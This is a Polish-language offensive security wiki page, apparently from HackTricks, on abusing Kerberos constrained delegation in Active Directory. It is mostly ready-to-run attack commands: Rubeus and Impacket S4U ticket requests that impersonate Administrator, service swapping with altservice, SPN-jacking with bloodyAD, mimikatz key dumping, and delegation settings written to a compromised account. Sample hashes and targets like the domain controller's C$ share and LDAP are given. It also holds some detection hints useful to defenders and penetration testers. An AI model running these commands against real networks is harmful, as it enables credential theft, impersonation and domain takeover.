# Delegowanie ograniczone

{{#include ../../banners/hacktricks-training.md}}

## Delegowanie ograniczone

Administrator domeny może **zezwolić** komputerowi na **podszywanie się pod użytkownika lub komputer** w przypadku dowolnej **usługi** na danej maszynie.

- **Service for User to self (_S4U2self_):** Każde **konto usługi posiadające SPN** może zazwyczaj uzyskać TGS do siebie w imieniu dowolnego użytkownika. Jeśli konto ma również ustawiony atrybut [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) w _userAccountControl_, ten TGS jest **przekazywalny** — dzięki temu przejście protokołu jest bezpośrednio przydatne w przypadku **klasycznego delegowania ograniczonego**.
- **Service for User to Proxy(_S4U2proxy_):** **Konto usługi** może uzyskać TGS w imieniu użytkownika dla SPN-ów wymienionych w **msDS-AllowedToDelegateTo**. Bilet dowodowy używany w S4U2Proxy musi być **przekazywalnym** biletem do usługi delegującej: rzeczywistym biletem klient-usługa przechwyconym od ofiary lub biletem wygenerowanym za pomocą **S4U2Self + T2A4D**.

**Uwaga**: Jeśli użytkownik w AD ma zaznaczoną opcję „_Konto jest poufne i nie można go delegować_” lub należy do grupy **Protected Users**, zazwyczaj **nie będzie można się pod niego podszyć** za pomocą delegowania ograniczonego. W nowoczesnych domenach, atakując konta z włączonym delegowaniem, preferuj materiał **AES** zamiast zakładać użycie wyłącznie RC4.

Oznacza to, że jeśli **przejmiesz hash usługi**, możesz **podszywać się pod użytkowników** i uzyskiwać w ich imieniu **dostęp** do dowolnej **usługi** na wskazanych maszynach (możliwe **privesc**).

Co więcej, **uzyskasz dostęp nie tylko do usługi, pod którą użytkownik może się podszyć, ale także do dowolnej usługi**, ponieważ SPN (żądaną nazwę usługi) nie jest sprawdzany (ta część biletu nie jest szyfrowana ani podpisywana). Dlatego jeśli masz dostęp do **usługi CIFS**, możesz również uzyskać dostęp do **usługi HOST**, używając na przykład flagi `/altservice` w Rubeus. Ta sama słabość polegająca na podmianie SPN jest wykorzystywana przez **Impacket getST -altservice** i inne narzędzia.

Ponadto **dostęp do usługi LDAP na DC** jest potrzebny do przeprowadzenia **DCSync**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Uwaga operatora:** nie ufaj wyłącznie zrzutom ekranu z **ADUC** ani BloodHounda podczas audytu **gMSA/sMSA**. W przypadku tych kont często nie jest widoczna standardowa karta Delegation, dlatego bezpośrednio enumeruj surowe atrybuty **`userAccountControl`** i **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Delegowanie ograniczone z przejściem protokołu a delegowanie ograniczone tylko Kerberos

Jeśli przejęte konto ma ustawienie **T2A4D**, zazwyczaj możesz przeprowadzić pełny łańcuch **`S4U2Self -> S4U2Proxy`**, mając tylko klucz usługi/TGT.<sup>[[2]](#references)</sup>

Jeśli ma tylko **`msDS-AllowedToDelegateTo`** (klasyczny tryb **„Use Kerberos only”**), delegowanie nadal może być podatne na nadużycia, ale bilet dowodowy dla S4U2Proxy musi być **przekazywalnym biletem użytkownik-do-usługi** dla delegującej usługi. Jedną z opcji jest przechwycenie TGS ofiary z **LSASS/ccache** i podanie go do drugiego etapu (`/tgs:` w Rubeus). **Nieprzekazywalny** bilet S4U2Self **nie** wystarczy w przypadku klasycznego delegowania ograniczonego; jeśli to jedyny dostępny bilet dowodowy, sprawdź [delegowanie ograniczone oparte na zasobach](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

Inną warunkową opcją jest pierwszy przeskok [RBCD](resource-based-constrained-delegation.md) do delegującej usługi: jeśli zwróci on **przekazywalny** bilet dla zamierzonego użytkownika i usługi, można go sprawdzić jako bilet dowodowy dla kolejnego przeskoku S4U2Proxy w trybie Kerberos only. Zweryfikuj flagi pierwszego biletu, SPN delegującej usługi, jej listę dozwolonych celów oraz wszelkie ograniczenia delegowania użytkownika; sama kontrola nad atrybutem RBCD nie potwierdza możliwości wykonania drugiego przeskoku.

### Uwagi o delegowaniu ograniczonym między domenami (2025+)

Od **Windows Server 2012/2012 R2** KDC obsługuje **delegowanie ograniczone między domenami/lasami** za pomocą rozszerzeń S4U2Proxy. Współczesne wersje (Windows Server 2016–2025) zachowują to działanie i dodają dwa identyfikatory SID PAC sygnalizujące przejście protokołu:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), gdy użytkownik uwierzytelnił się standardowo.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), gdy usługa potwierdziła tożsamość poprzez przejście protokołu.

Gdy przejście protokołu jest używane między domenami, w PAC powinien znajdować się `SERVICE_ASSERTED_IDENTITY`, co potwierdza powodzenie kroku S4U2Proxy.<sup>[[1]](#references)</sup>

### Impacket / narzędzia dla Linuxa (altservice i pełne S4U)

Nowszy Impacket (0.11.x+) udostępnia ten sam łańcuch S4U i podmianę SPN co Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Jeśli wolisz najpierw sfałszować ST użytkownika (np. mając tylko hash offline), użyj **ticketer.py** razem z **getST.py** do S4U2Proxy. **tgssub.py** też się przydaje, gdy masz już działający ccache i chcesz tylko zmienić klasę usługi dla tego samego hosta. Zobacz otwarte zgłoszenie Impacket #1713, aby poznać aktualne problemy (KRB_AP_ERR_MODIFIED, gdy sfałszowany ST nie pasuje do klucza SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: przekierowywanie celu delegowania ograniczonego

Klasyczna delegacja ograniczona autoryzuje **ciąg SPN** w `msDS-AllowedToDelegateTo`, a nie niezmienny SID celu. Podczas S4U2Proxy KDC ustala, które konto jest aktualnie właścicielem tego SPN, i szyfruje bilet usługi długoterminowym kluczem tego konta. Dlatego kontrola nad kontem delegującym oraz uprawnienie `WriteSPN` do innego konta usługi/komputera pozwalają przekierować niezmieniony warunek delegowania bez `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Istnieją dwa warianty:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** dozwolony SPN jest osierocony, ponieważ jego poprzedni właściciel został usunięty lub zmieniono jego nazwę albo usunięto z niego SPN. Dodaj go bezpośrednio do wybranego konta docelowego.
- **Live SPN-jacking:** SPN nadal należy do konta źródłowego. Walidacja zduplikowanych SPN zwykle blokuje zapis na koncie docelowym, dlatego potrzebujesz `WriteSPN` do obu obiektów: usuń SPN ze źródła, dodaj go do celu, pobierz bilet i przywróć pierwotną rejestrację.

Poniższy uproszczony przebieg w systemie Linux przenosi dozwolony SPN, wykonuje S4U jako przejęty podmiot delegujący i zmienia nazwę usługi w bilecie na przydatną usługę na nowym celu.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` to druga, odrębna prymitywa. Ticket S4U2Proxy został zaszyfrowany kluczem konta, które jest teraz właścicielem `$DELEGATED_SPN`; ponieważ nazwa usługi ticketu (`sname`) znajduje się poza zaszyfrowaną treścią ticketu, narzędzia mogą podstawić inną klasę usługi/nazwę hosta, której usługa używa tego samego klucza konta. SPN-jacking najpierw zmienia **klucz konta**, którym chroniony jest ticket, a podmiana klasy usługi zmienia **miejsce przedstawienia** tego ticketu.<sup>[[5]](#references)[[6]](#references)</sup>

W przypadku jacking na żywo wykonaj dwa zapisy LDAP w odwrotnej kolejności natychmiast po uzyskaniu ticketu, aby uniknąć zakłócenia działania legalnej usługi. Na kontrolerach domeny z włączonym audytem kont komputerów szukaj zdarzeń Security **4742**, w których `servicePrincipalName` jest usuwany z jednego komputera i wkrótce potem dodawany do innego — zwłaszcza gdy nazwa hosta SPN różni się od `dNSHostName` celu. Skoreluj je ze zdarzeniem **4769**: S4U2Self przedstawia to samo konto jako klienta/usługę, natomiast S4U2Proxy wypełnia pole **Transited Services**.<sup>[[5]](#references)</sup>

### Konfigurowanie delegowania na kontrolowanym koncie

Ta metoda wymaga **efektywnego dostępu do zapisu** do atrybutów delegowania konta komputera lub usługi (na przykład `GenericAll` albo `WriteDACL`, po którym następuje zmiana ACL), **a także** uprawnienia użytkownika `SeEnableDelegationPrivilege` dla konta dokonującego zmiany LDAP. Microsoft wymaga tego uprawnienia przy modyfikacji `msDS-AllowedToDelegateTo`; same uprawnienia do kontroli obiektu go nie zastępują. Przed użyciem klienta LDAP, takiego jak **bloodyAD**, do skonfigurowania delegowania z przejściem protokołu sprawdź oba warunki.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Istniejące konto komputera może być kandydatem nawet wtedy, gdy `ms-DS-MachineAccountQuota` wynosi zero; ten limit dotyczy domyślnej ścieżki tworzenia nowych komputerów, a nie uprawnień do istniejącego obiektu. Aby skorzystać ze skonfigurowanej delegacji, potrzebujesz również kontroli nad kluczem lub hasłem konta delegującego, prawidłowej nazwy SPN oraz konta użytkownika, którego dane uwierzytelniające można delegować. Te warunki oraz efektywny dostęp do katalogu należy sprawdzić osobno.

- Krok 1: **Pobierz TGT dozwolonej usługi**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Istnieją **inne sposoby uzyskania biletu TGT** lub **RC4** albo **AES256** bez uprawnień SYSTEM na komputerze, takie jak Printer Bug, unconstrain delegation, NTLM relaying i nadużycie Active Directory Certificate Service
>
> **Mając sam bilet TGT (lub jego hash), możesz przeprowadzić ten atak bez przejmowania całego komputera.**

- Step2: **Uzyskaj TGS dla usługi, podszywając się pod użytkownika**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Więcej informacji na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) i [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Przegląd delegowania ograniczonego Kerberos (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Nadużywanie delegowania za pomocą Impacket (część 2): delegowanie ograniczone (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Delegowanie ograniczone Kerberos (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity uśmierciło domenę: ofensywny przegląd Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: przypadek brzegowy w nadużywaniu WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
